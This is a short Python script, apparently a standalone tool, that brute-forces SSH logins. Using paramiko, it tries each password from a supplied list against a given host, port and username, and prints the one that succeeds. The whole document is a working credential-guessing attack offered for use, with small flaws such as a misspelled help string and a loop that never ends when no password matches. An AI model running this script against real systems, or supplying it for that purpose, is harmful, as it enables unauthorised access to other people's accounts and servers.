import paramiko
import subprocess
import time
import argparse

parser = argparse.ArgumentParser(description='Brute force to SSH')
parser.add_argument('host', help='host to connect ssh')
parser.add_argument('port', help='port you will use to connect ssh')
parser.add_argument('username', help='usernaem you will brute force')
parser.add_argument('passlst', help='file with all the passwords')
args = parser.parse_args()


validate = False


host = args.host 
port = args.port 
username = args.username
passlst = args.passlst

f = open(passlst, "r")
content = f.readlines()

subprocess.run(['service', 'ssh', ' start'])
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())


while not validate:
    for i in content:
        try:
            print (i.strip())
            ssh.connect(host, port, username, i.strip())
            validate = True

            if validate:
                print ("password = "+ i.strip())
                break
        except:
            print ("not " + i.strip())
            time.sleep(10)


f.close()
